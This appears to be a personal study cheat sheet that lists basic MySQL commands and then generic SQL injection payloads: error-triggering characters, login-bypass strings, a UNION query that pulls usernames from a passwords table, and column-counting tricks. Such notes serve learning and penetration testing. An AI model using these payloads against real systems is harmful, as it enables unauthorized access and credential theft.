# SQLi

## MySQL Basics

### Connect to a MySQL Database
```zsh
mysql -u <user> -h <host> -P <port> -p<pass>
```
### Enumerate Databases
```MySQL
SHOW Databases;
```
```MySQL
USE <database>;
```
### Enumerate Tables
```MySQL
SHOW TABLES;
```

```MySQL
DESCRIBE <table>;
```

### Retrieve Data
```MySQL
SELECT * FROM <table>;
```
```MySQL
SELECT <column1>,<column2> FROM <table>;
```
```MySQL
SELECT <column1>,<column2> FROM <table> ORDER BY <column2>;
```
```MySQL
SELECT <column1>,<column2> FROM <table> WHERE <condition>;
```

## SQL Injection
### Check for errors with:
```MySQL
'
```
```MySQL
"
```
```MySQL
#
```
```MySQL
;
```
```MySQL
)
```

### Bypassing a Log in Portal
```MySQL
admin' OR '1'='1
```
```MySQL
admin'-- 
```

### Using a UNION Clause
Remove or add from "2, 3, 4" as needed because the columns need to be "even"
```MySQL
SELECT * from <table> where <column> = '1' UNION SELECT username, 2, 3, 4 from passwords-- '
```

### Detecting the number of Columns
```MySQL
' order by n-- 
```
where n is the max value that does not cause an error.


-or-

```MySQL
' UNION select 1,2,3-- 
```

